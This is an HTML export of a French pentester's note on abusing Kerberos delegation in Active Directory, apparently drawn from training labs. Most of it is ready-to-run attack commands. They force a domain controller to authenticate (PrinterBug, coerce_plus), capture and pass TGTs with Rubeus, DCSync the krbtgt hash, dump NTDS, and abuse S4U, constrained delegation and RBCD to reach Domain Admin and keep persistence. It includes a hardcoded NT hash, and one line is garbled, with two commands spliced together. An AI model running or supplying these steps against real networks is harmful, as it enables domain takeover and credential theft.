<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>09-kerberos delegation</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>09-kerberos delegation</h1><br/><p><ol><li><h2>Trouver les chemins de d√©l√©gation</h2></li><li><strong>Script rapide</strong> : <code>findDelegation.py &quot;&lt;domain&gt;&quot; &quot;&lt;user&gt;&quot; &quot;&lt;password&gt;&quot;</code></li></ol></p><p><ul><li><strong>BloodHound Cypher</strong> :</li><li>Unconstrained : <code>MATCH (c:Computer {unconstraineddelegation:true}) RETURN c</code></li></ul></p><p><ul><li>Utilisateur unconstrained : <code>MATCH (u:User {unconstraineddelegation:true}) RETURN u</code></li></ul></p><p><ul><li>Relations <em>AllowedToDelegate</em> : <code>MATCH p=(b:Base)-[:AllowedToDelegate]-&gt;(c) RETURN p</code></li></ul></p><p><ul><li>Constrained vers une cible pr√©cise :</li></ul></p><p> <code>MATCH p=(h:Computer)-[:CanDelegate]-&gt;(c:Computer {name:&quot;&lt;TARGETFQDN&gt;&quot;}) RETURN p</code></p><p></p><p></p><p></p><p></p><p><ol><li>2. <h2>2. Unconstrained Delegation ‚Äì impersonation compl√®te</h2></li><li><strong>Forcer une connexion</strong> (PetitPotam, PrinterBug, etc.) vers la machine unconstrained.</p><p></li></ol><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># starts the ticket monoitor </span><br /><span style="color:#0088ff;font-weight:400">## watch for TGTs every  seconds </span><br />C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>Public<span style="color:#ff9d00;font-weight:700">\</span>Loader.exe <span style="color:#ff9d00;font-weight:700">-</span>path http<span style="color:#ff9d00;font-weight:700">://</span><span style="color:#333333;font-weight:400">127.0</span>.<span style="color:#333333;font-weight:400">0.1</span><span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">8080</span><span style="color:#ff9d00;font-weight:700">/</span>Rubeus.exe <span style="color:#ff9d00;font-weight:700">-</span>args monitor <span style="color:#ff9d00;font-weight:700">/</span>targetuser<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#00117f;font-weight:400">TECHCORP-DC</span>$ <span style="color:#ff9d00;font-weight:700">/</span>interval<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">5</span> <span style="color:#ff9d00;font-weight:700">/</span>nowrap<br /><span style="color:#0088ff;font-weight:400">## ON LINUX START kerberos relay on vulnerable controlled machine</span><br /><span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>krbrelayx<span style="color:#ff9d00;font-weight:700">/</span>krbrelayx.py <span style="color:#ff9d00;font-weight:700">-</span>hashes <span style="color:#ff9d00;font-weight:700">:</span>02cb8258df07966e32677128e5ff1d26<br /><span style="color:#0088ff;font-weight:400"># on student VM: exploits MS-RRPN interface (printer bug) to force the DC to authenticated to the unconstrained serve us-web</span><br />C<span style="color:#ff9d00;font-weight:700">:\</span>AD<span style="color:#ff9d00;font-weight:700">\</span>Tools<span style="color:#ff9d00;font-weight:700">\</span><span style="color:#00117f;font-weight:400">MS-RPRN</span>.exe <span style="color:#ff9d00;font-weight:700">\\</span><span style="color:#00117f;font-weight:400">techcorp-dc</span>.techcorp.local <span style="color:#ff9d00;font-weight:700">\\</span><span style="color:#00117f;font-weight:400">us-web</span>.usnetexec smb dc1.delegate.vl <span style="color:#ff9d00;font-weight:700">-</span>u <span style="color:#333333;font-weight:400">&#39;oxdf$&#39;</span> <span style="color:#ff9d00;font-weight:700">-</span>p 0xdf0xdf. <span style="color:#ff9d00;font-weight:700">-</span>M coerce_plus <span style="color:#ff9d00;font-weight:700">-</span>o LISTENER<span style="color:#ff9d00;font-weight:700">=</span>oxdf.delegate.vl METHOD<span style="color:#ff9d00;font-weight:700">=</span>PrinterBug.techcorp.local<br /><span style="color:#0088ff;font-weight:400">## on linux netexec has coerce_plus module that will test common methods</span><br />nxc smb dc1.delegate.vl <span style="color:#ff9d00;font-weight:700">-</span>u <span style="color:#333333;font-weight:400">&#39;oxdf$&#39;</span> <span style="color:#ff9d00;font-weight:700">-</span>p 0xdf0xdf. <span style="color:#ff9d00;font-weight:700">-</span>M coerce_plus <br /><span style="color:#0088ff;font-weight:400">## linux exploit if success it will save TGT ccache </span><br />netexec smb dc1.delegate.vl <span style="color:#ff9d00;font-weight:700">-</span>u <span style="color:#333333;font-weight:400">&#39;oxdf$&#39;</span> <span style="color:#ff9d00;font-weight:700">-</span>p 0xdf0xdf. <span style="color:#ff9d00;font-weight:700">-</span>M coerce_plus <span style="color:#ff9d00;font-weight:700">-</span>o LISTENER<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#0088ff;font-weight:400">$controlledVulnerableDNS</span> METHOD<span style="color:#ff9d00;font-weight:700">=</span>PrinterBug<br /><span style="color:#0088ff;font-weight:400"># pass the ticket using the stolen tikcte</span><br />C<span style="color:#ff9d00;font-weight:700">:\</span>AD<span style="color:#ff9d00;font-weight:700">\</span>Tools<span style="color:#ff9d00;font-weight:700">\</span>Loader.exe <span style="color:#ff9d00;font-weight:700">-</span>Path C<span style="color:#ff9d00;font-weight:700">:\</span>AD<span style="color:#ff9d00;font-weight:700">\</span>Tools<span style="color:#ff9d00;font-weight:700">\</span>Rubeus.exe <span style="color:#ff9d00;font-weight:700">-</span>args ptt <span style="color:#ff9d00;font-weight:700">/</span>ticket<span style="color:#ff9d00;font-weight:700">:</span>&lt;BASE64_TICKET_HERE&gt;<br /><br /><span style="color:#0088ff;font-weight:400"># dcsync </span><br />C<span style="color:#ff9d00;font-weight:700">:\</span>AD<span style="color:#ff9d00;font-weight:700">\</span>Tools<span style="color:#ff9d00;font-weight:700">\</span>Loader.exe <span style="color:#ff9d00;font-weight:700">-</span>path C<span style="color:#ff9d00;font-weight:700">:\</span>AD<span style="color:#ff9d00;font-weight:700">\</span>Tools<span style="color:#ff9d00;font-weight:700">\</span>SafetyKatz.exe <span style="color:#ff9d00;font-weight:700">-</span>args <span style="color:#3ad900;font-weight:400">&quot;lsadump::evasive-dcsync /user:techcorp\krbtgt /domain:techcorp.local&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;exit&quot;</span><br /><span style="color:#0088ff;font-weight:400">## linux DCSYNC </span><br />KRB5CCNAME<span style="color:#ff9d00;font-weight:700">=</span>DC1<span style="color:#ff9d00;font-weight:700">\</span>$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache nxc smb dc1.delegate.vl <span style="color:#ff9d00;font-weight:700">--</span><span style="color:#00117f;font-weight:400">use-kcache</span> <span style="color:#ff9d00;font-weight:700">--</span>ntds<br /></pre></div><ol><li><strong>Extraire les tickets</strong> :</li></ol></p><p><code>mimikatz privilege::debug sekurlsa::tickets /export</code><code></code></p><p><code>Rubeus dump /luser /nowrap</code><code></code></p><p><code></code><ol><li><strong>PTT</strong> : <code>Rubeus ptt /ticket:&lt;krbtgt_ticket.kirbi&gt;</code></li></ol></p><p><ul><li>R√©sultat : <em>Kerberos TGT</em> ‚Üí <strong>Pass-the-Ticket</strong> ‚Üí <strong>Domain Admin</strong> üî¥</li></ul></p><p></p><p><img src="images/487-1.png" alt="images/487-1.png" /></p><p><ol><li>3. <h2>3. Constrained Delegation</h2></li></ol></p><p></p><p><h4>3-a. Avec </h4><strong><h4>protocol transition</h4></strong><h4> (UAC </h4><code><h4>TRUST_TO_AUTH_FOR_DELEGATION</h4></code><h4>)</h4></p><p><code># Obtenir un TGT pour soi</code><code></code></p><p><code>Rubeus asktgt /user:&lt;account&gt; /rc4:&lt;hash&gt;</code><code></code></p><p><code></code><code></code></p><p><code># S4U2Self ‚Üí ticket de service √† son propre SPN</code><code></code></p><p><code>Rubeus s4u /ticket:&lt;tgt&gt; /impersonateuser:administrator /msdsspn:HTTP/&lt;svc&gt; /altservice:cifs/ldap</code><code></code></p><p><code></code><code></code></p><p><code># S4U2Proxy ‚Üí ticket de service pour la cible</code><code></code></p><p><code>Rubeus s4u /ticket:&lt;s4u2self.kirbi&gt; /impersonateuser:administrator /msdsspn:cifs/&lt;target&gt;</code><ul><li><code>‚óá </code>‚óá R√©sultat : <em>Kerberos TGS</em> pour le service cible.</p><p></li></ul><img src="images/487-2.png" alt="images/487-2.png" /></p><p></p><p></p><p><h4>3-b. </h4><strong><h4>Sans protocol transition</h4></strong><h4> (UAC </h4><code><h4>TRUSTED_FOR_DELEGATION</h4></code><h4>)</h4><ol><li>Cr√©er / rep√©rer <strong>Computer X</strong> d√©l√©gu√© vers <strong>Service Y</strong>.</li></ol></p><p><ol><li>Ajouter <strong>Computer Z</strong> (ou soi-m√™me) et l‚Äôautoriser :</li></ol></p><p><code>addcomputer.py -computer-name &lt;Z&gt; -computer-pass &quot;&lt;Passw0rd!&gt;&quot;</code><code></code></p><p><code>kdcldap.py delegate --from Z$ --to constrained$ -d &lt;domain&gt;</code><code></code></p><p><code></code><ol><li><code>getST.py -spn host/&lt;constrained&gt; -impersonate Administrator -dc-ip &lt;dc_ip&gt; -hashes &lt;Z_hash&gt;</code></li></ol></p><p><ul><li>R√©sultat : <em>Kerberos TGS</em> ‚Üí privil√®ges du compte vis√©.</li></ul></p><p></p><p></p><p><ol><li>4. <h2>4. Resource-Based Constrained Delegation (RBCD)</h2></li></ol></p><p></p><p><img src="images/487-3.png" alt="images/487-3.png" /></p><p></p><p>Le but est d&#39;avoir admin sur une machine dont on a les droits GenericWrite </p><p>Le seul usage de RBCD sinon c&#39;est pas exploitable car c&#39;est la service qui delegue pas le user <ol><li><strong>Ajouter un compte machine contr√¥l√©</strong> :</li></ol></p><p> <code>addcomputeraccount -computer-name &lt;comp&gt; -computer-pass &quot;&lt;Pass&gt;&quot;</code></p><p><ol><li><strong>Attribuer RBCD</strong> :</li></ol></p><p> <code>setrbcd.py -delegate-from &lt;comp&gt;$ -delegate-to &lt;victim&gt;$</code></p><p><ol><li>Obtenir le ticket :</li></ol></p><p> <code>getST.py -spn cifs/&lt;victim&gt; -impersonate Administrator -dc-ip &lt;dc_ip&gt; -domain &lt;dom&gt; &lt;comp&gt;$:&lt;Pass&gt;</code></p><p><ul><li>‚ûú <strong>Admin</strong> ü©∑ sur la cible.</li></ul></p><p></p><p></p><p><ol><li>5. <h2>5. Abus direct S4U2Self / Machine 0% TGT</h2></li></ol></p><p><code>getTGT.py -dc-ip &lt;dc_ip&gt; -hashes &lt;machine_hash&gt; &lt;domain&gt;/&lt;machine$&gt;</code><code></code></p><p><code>getST.py -spn host/&lt;dc&gt; -impersonate &quot;administrator&quot; -dc-ip &lt;dc_ip&gt; \</code><code></code></p><p><code>         -k -no-pass &lt;domain&gt;/&lt;machine$&gt;</code><ul><li><code>‚óá </code>‚óá ‚ûú <em>Kerberos TGT</em> ‚Üí <strong>Admin</strong> ü©∑ sans interaction utilisateur.</li></ul></p><p></p><p></p><p><strong>Livrables phase 9</strong><ul><li>Tickets <strong>TGT/TGS</strong> r√©cup√©r√©s ou g√©n√©r√©s (Unconstrained, S4U).</li></ul></p><p><ul><li>Conversions <em>Pass-the-Ticket</em> valides pour escalader jusqu‚Äô√† <strong>Domain Admin</strong>.</li></ul></p><p><ul><li>RBCD pr√™t (machines ajout√©es + ACL modifi√©es) pour persistance ou rebond ult√©rieur.</li></ul></p><p></p><p></p></div>
</body>
</html>
